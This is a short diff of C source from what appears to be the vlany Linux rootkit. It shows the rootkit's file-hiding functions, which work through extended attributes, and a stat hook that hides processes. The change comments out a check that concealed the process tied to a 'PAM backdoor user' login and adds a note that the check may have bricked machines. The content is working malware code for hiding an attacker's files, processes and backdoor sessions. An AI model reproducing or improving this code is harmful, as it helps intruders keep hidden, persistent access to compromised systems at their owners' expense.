@@ -93,7 +93,6 @@ int hidden_fxattr(int fd)
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    // file isn't hidden with extended attributes..sigh
     free(buf); return 0;
 }
 
@@ -133,7 +132,6 @@ int hidden_lxattr(const char *filename)
         keylen = strlen(key) + 1; buflen -= keylen; key += keylen;
     }
 
-    // file isn't hidden with extended attributes..sigh
     free(buf); return 0;
 }
 
@@ -148,12 +146,13 @@ int hidden_xstat(int ver, const char *filename, int mode)
     if(strncmp(filename, proc_path, strlen(proc_path))) { CLEAN(proc_path); return 0; } // readdir is just doing a general file check, bail
     CLEAN(proc_path);
 
-    char proc_cmdline[256], buf[128];
-    snprintf(proc_cmdline, sizeof(proc_cmdline), "%s/cmdline", filename);
+    //char proc_cmdline[256], buf[128];
+    //snprintf(proc_cmdline, sizeof(proc_cmdline), "%s/cmdline", filename);
 
-    HOOK(old_open, COPEN);
-    int fd = old_open(proc_cmdline, 0x00000000, 0666);
-    while(read(fd, &buf, sizeof(buf)) > 0) if(!strcmp(buf, "(sd-pam)")) { close(fd); return 1; } // this process shows up when the PAM backdoor user is logged in
+    // i think this part here is somewhat responsible for bricking the box from memory of a version of vlany i had before losing it originally
+    //HOOK(old_open, COPEN);
+    //int fd = old_open(proc_cmdline, 0x00000000, 0666);
+    //while(read(fd, &buf, sizeof(buf)) > 0) if(!strcmp(buf, "(sd-pam)")) { close(fd); return 1; } // this process shows up when the PAM backdoor user is logged in
 
     if(mode == 32)
     {
